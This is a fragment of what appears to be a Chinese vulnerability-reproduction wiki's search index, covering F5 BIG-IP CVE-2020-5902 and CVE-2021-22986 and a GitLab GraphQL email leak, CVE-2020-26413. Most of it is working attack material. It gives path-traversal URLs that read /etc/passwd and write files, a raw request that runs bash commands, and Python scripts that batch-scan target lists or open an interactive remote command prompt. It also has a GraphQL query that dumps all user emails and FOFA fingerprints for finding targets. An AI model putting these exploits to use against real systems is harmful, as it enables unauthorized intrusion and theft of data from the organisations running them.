\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3001\u5f00\u542f/\u7981\u7528\u670d\u52a1\u3001\u521b\u5efa/\u5220\u9664\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7b49\u3002\u8be5\u6f0f\u6d1e\u5f71\u54cd\u63a7\u5236\u9762\u677f\u53d7\u5f71\u54cd\uff0c\u4e0d\u5f71\u54cd\u6570\u636e\u9762\u677f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#fofa","text":"[!NOTE] title=\"BIG-IP&reg ;- Redirect\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728 tmshCmd \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 command \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.runTmshCommand(cmd, request); \u65b9\u6cd5\u6267\u884c\u547d\u4ee4\uff0c\u9650\u5236\u4e86\u6267\u884c delete,create,list,modify \u3002 if ( \"POST\" . equalsIgnoreCase ( request . getMethod ())) { String [] cmdArray = command . split ( \" \" ); String operation = cmdArray [ 0 ] ; String module = cmdArray [ 2 ] ; if ( ! ShellCommandValidator . checkForBadShellCharacters ( command ) && ( operation . equals ( \"create\" ) || operation . equals ( \"delete\" ) || operation . equals ( \"list\" ) || operation . equals ( \"modify\" )) && WHITELISTED_TMSH_MODULES . contains ( module )) { try { String [] args = new String [] { command }; Result result = Syscall . callElevated ( Syscall . TMSH , args ); output = result . getOutput (); error = result . getError (); } catch ( CallException var11 ) { logger . error ( NLSEngine . getString ( \"ilx.workspace.error.TmshCommandFailed\" ) + \": \" + var11 . getMessage ()); error = var11 . getMessage (); } } else { error = NLSEngine . getString ( \"ilx.workspace.error.RejectedTmshCommand\" ); } \u5728 fileRead \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 fileName \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.readFile(fileName); \u65b9\u6cd5\uff0c\u8fdb\u884c\u6587\u4ef6\u8bfb\u53d6\u3002 \u5728 fileSave \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 fileName \uff0c content \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.saveFile(request); \u65b9\u6cd5\uff0c\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u3002 \u8be6\u60c5\u5229\u7528\u65b9\u5f0f https://github.com/jas502n/CVE-2020-5902 \u8be6\u60c5\u5229\u7528\u65b9\u5f0f https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u8bfb\u53d6\u6587\u4ef6","text":"http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","title":"\u8bfb\u53d6\u6587\u4ef6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u5199\u5165\u6587\u4ef6","text":"http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/PeiQi.txt&content=PceiQi \u8bfb\u53d6\u6587\u4ef6 /tmp/PeiQi \u6210\u529f\u5199\u5165\u6587\u4ef6","title":"\u5199\u5165\u6587\u4ef6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-5902.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Language\" : \"zh-CN,zh;q=0.9\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = version_url , timeout = 10 , verify = False , headers = headers ) if \"output\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"output\" ])) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 \\033 [0m\" ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 , {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u53c2\u8003\u6587\u7ae0","text":"https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/","text":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-22986 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 F5 BIG-IP \u662f\u7f8e\u56fd F5 \u516c\u53f8\u7684\u4e00\u6b3e\u96c6\u6210\u4e86\u7f51\u7edc\u6d41\u91cf\u7ba1\u7406\u3001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7ba1\u7406\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd\u7684\u5e94\u7528\u4ea4\u4ed8\u5e73\u53f0\u3002 \u8fd1\u65e5\uff0cF5\u53d1\u5e03\u4e86F5 BIG-IQ/F5 BIG-IP \u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u6267\u884c\u7684\u98ce\u9669\u58f0\u660e\uff0cF5\u5b89\u5168\u516c\u544a\u66f4\u65b0\u4e86BIG-IP\uff0cBIG-IQ\u4e2d\u7684\u591a\u4e2a\u4e25\u91cd\u6f0f\u6d1e\u3002\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u5c06f5 big-iq,f5 big-ip\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff0c\u907f\u514d\u906d\u5230\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA \u00b6 [!NOTE] icon_hash=\"-335242539\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305 POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} \u6210\u529f\u6267\u884c\u547d\u4ee4 id \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u6279\u91cf\u6d4b\u8bd5 import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 2 ) if \"commandResult\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"commandResult\" ])) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"https://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) \u547d\u4ee4\u6267\u884c import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if 'root' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"commandResult\" ])) while True : Cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) POC_2 ( target_url , Cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , Cmd ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s \"}' % Cmd try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m {} \\033 [0m\" . format ( json . loads ( response . text )[ \"commandResult\" ])) except Exception as e : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-22986"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#f5-big-ip-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2021-22986","text":"","title":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-22986"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#\u6f0f\u6d1e\u63cf\u8ff0","text":"F5 BIG-IP \u662f\u7f8e\u56fd F5 \u516c\u53f8\u7684\u4e00\u6b3e\u96c6\u6210\u4e86\u7f51\u7edc\u6d41\u91cf\u7ba1\u7406\u3001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7ba1\u7406\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd\u7684\u5e94\u7528\u4ea4\u4ed8\u5e73\u53f0\u3002 \u8fd1\u65e5\uff0cF5\u53d1\u5e03\u4e86F5 BIG-IQ/F5 BIG-IP \u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u6267\u884c\u7684\u98ce\u9669\u58f0\u660e\uff0cF5\u5b89\u5168\u516c\u544a\u66f4\u65b0\u4e86BIG-IP\uff0cBIG-IQ\u4e2d\u7684\u591a\u4e2a\u4e25\u91cd\u6f0f\u6d1e\u3002\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u5c06f5 big-iq,f5 big-ip\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff0c\u907f\u514d\u906d\u5230\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#fofa","text":"[!NOTE] icon_hash=\"-335242539\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305 POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} \u6210\u529f\u6267\u884c\u547d\u4ee4 id","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u6279\u91cf\u6d4b\u8bd5 import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 2 ) if \"commandResult\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"commandResult\" ])) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"https://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) \u547d\u4ee4\u6267\u884c import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if 'root' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"commandResult\" ])) while True : Cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) POC_2 ( target_url , Cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , Cmd ): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\" : \"Basic YWRtaW46QVNhc1M=\" , \"X-F5-Auth-Token\" : \"\" , \"Content-Type\" : \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s \"}' % Cmd try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m {} \\033 [0m\" . format ( json . loads ( response . text )[ \"commandResult\" ])) except Exception as e : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/","text":"GitLab Graphql\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-26413 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 GitLab\u4e2d\u5b58\u5728Graphql\u63a5\u53e3 \u8f93\u5165\u6784\u9020\u7684\u6570\u636e\u65f6\u4f1a\u6cc4\u9732\u7528\u6237\u90ae\u7bb1\u548c\u7528\u6237\u540d \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] GitLab 13.4 - 13.6.2 FOFA \u00b6 [!NOTE] title=\"GitLab\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u6765\u6e90\u4e3a hackone\u4e0a\u7684\u4e00\u7bc7\u516c\u5f00\u62a5\u544a https://gitlab.com/gitlab-org/gitlab/-/issues/244275 \u610f\u601d\u4e3a\u5f53\u4f7f\u7528\u6784\u9020\u7684\u8bed\u53e5\u5728\u63a5\u53e3\u67e5\u8be2\u65f6\u4f1a\u8fd4\u56de\u90ae\u7bb1\u4fe1\u606f\uff0c\u5982\u56fe \u8bbf\u95ee URL http://xxx.xxx.xxx.xxx/-//graphql-explorer Gitlab\u672c\u8eab\u4e0d\u5141\u8bb8\u83b7\u53d6\u8d26\u53f7\u90ae\u7bb1\u4fe1\u606f\uff0c\u8fd9\u91cc\u901a\u8fc7\u8c03\u7528 Graphql \u7528\u6237\u540d\u67e5\u8be2\u9020\u6210\u4e86\u90ae\u7bb1\u6cc4\u9732\u6f0f\u6d1e \u67e5\u770b\u5b8c\u62a5\u544a\u540e\u53d1\u73b0\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u6709\u8d26\u53f7\u7528\u6237\u540d\uff0c\u5728\u4e0d\u77e5\u9053\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u83b7\u53d6\u90ae\u7bb1\uff0c\u5728 Graphql\u5b98\u7f51 \u67e5\u770b\u5f97\u77e5\u53ef\u4ee5\u901a\u8fc7\u53e6\u4e00\u4e2a\u6784\u9020\u7684\u8bed\u53e5\u4e00\u6b21\u6027\u8fd4\u56de\u6240\u6709\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1 \u53d1\u5305\u8c03\u7528\u4e86 /api/graphql \u63a5\u53e3\u53d1\u9001\u6570\u636e \u5b8c\u6574\u6570\u636e\u5305\u4e3a POST /api/graphql HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx Co ntent - Le n g t h : 212 Co ntent - Type : applica t io n /jso n { \"query\" : \"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\" , \"variables\" : null , \"operationName\" : null } \u6210\u529f\u8fd4\u56de\u6570\u636e\uff0c\u9020\u6210 Gitlab\u7684\u7528\u6237\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import json from requests.packages.urllib3.exceptions import 